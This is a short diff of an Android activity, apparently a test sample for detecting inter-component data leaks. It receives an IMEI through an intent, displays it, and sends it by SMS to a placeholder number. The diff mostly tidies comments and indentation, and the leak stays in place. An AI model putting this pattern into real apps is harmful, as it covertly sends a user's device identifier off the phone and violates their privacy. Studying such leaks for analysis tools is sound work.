@@ -30,16 +30,14 @@ public class Activity2 extends Activity {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_activity2);
 		tv = (TextView) findViewById(R.id.textView1);
-		//che = "android.telephony.SmsManager";
+
 		che = "com.example.sms.send";
 		phoneNo = "555-4" ;
 		Intent im = getIntent();
-		  //value = im.getStringExtra("imei");
-		  value= getIntent().getExtras().getString("imei");
-		  tv.setText(value);
-		
-		  SmsManager sm = SmsManager.getDefault();
-		  sm.sendTextMessage(phoneNo, null, value,null, null);
+		value= getIntent().getExtras().getString("imei");
+		tv.setText(value);
+		SmsManager sm = SmsManager.getDefault();
+		sm.sendTextMessage(phoneNo, null, value,null, null);
 		 
 	}
 
